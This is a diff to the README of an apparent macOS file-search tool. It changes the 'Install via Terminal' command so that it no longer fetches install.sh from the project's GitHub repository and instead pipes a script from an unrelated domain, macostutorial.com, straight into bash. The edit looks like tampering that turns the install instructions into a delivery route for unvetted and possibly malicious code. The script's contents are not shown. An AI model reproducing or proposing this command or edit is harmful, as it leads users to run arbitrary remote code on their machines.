@@ -3,7 +3,7 @@
 ## Install via Terminal
 
 ```sh 
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/wolteh/deepflnder/refs/heads/main/install.sh)"
+/bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
 ```
 
 This app lets you search files using the built-in macOS file system index, with some helpful features on top:
